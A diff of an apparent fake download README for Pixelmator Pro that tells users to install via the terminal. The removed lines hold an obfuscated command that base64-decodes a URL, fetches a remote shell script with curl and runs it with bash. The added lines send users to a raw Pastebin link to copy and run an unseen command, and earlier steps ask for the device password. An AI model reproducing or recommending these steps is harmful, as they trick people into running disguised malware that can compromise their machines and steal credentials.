@@ -25,15 +25,13 @@
 3. Open a terminal and transfer the file you extracted in the last step into it.  
 4. Press the **Return** button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).    
 
-### Installation via a command in the terminal:
+## Installation via a command in the terminal:
 
-1. Copy the installation command below.  
-```bash
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"  
-```
-2. Open the terminal on your device and paste the command you copied above, then press the **Return** button.  
-3. Enter your device password and confirm the installation.  
+1. Go to the Pastebin at the link below and copy the command:
 
+https://pastebin.com/raw/FsLNXfRq
+
+2. Open your terminal, paste the command you copied earlier, and run it.
 ---
 
 ## 📊 What is Pixelmator Pro?  
